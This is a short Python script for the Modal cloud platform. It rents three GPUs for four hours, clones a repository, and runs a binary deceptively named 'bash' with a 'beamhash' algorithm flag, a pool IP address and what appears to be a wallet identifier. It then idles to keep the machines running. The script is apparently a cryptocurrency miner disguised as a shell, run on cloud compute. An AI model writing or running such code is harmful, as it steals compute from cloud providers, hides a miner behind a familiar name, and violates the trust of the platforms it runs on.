import modal
import subprocess
import time

app = modal.App("t4x3-runner")

image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
    )
    .apt_install(
        "bash",
        "git",
        "python3",
        "python3-pip",
        "python-is-python3"
    )
)

@app.function(
    image=image,
    gpu=modal.gpu.T4(count=3),
    timeout=60 * 60 * 4,
    secrets=[modal.Secret.from_name("github-pat")]
)
def run_script():
    subprocess.run(["nvidia-smi"], check=True)

    cmd = """
    git clone https://github.com/hujisanda/lol198.git
    cd lol198
    chmod u+x bash
    ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)
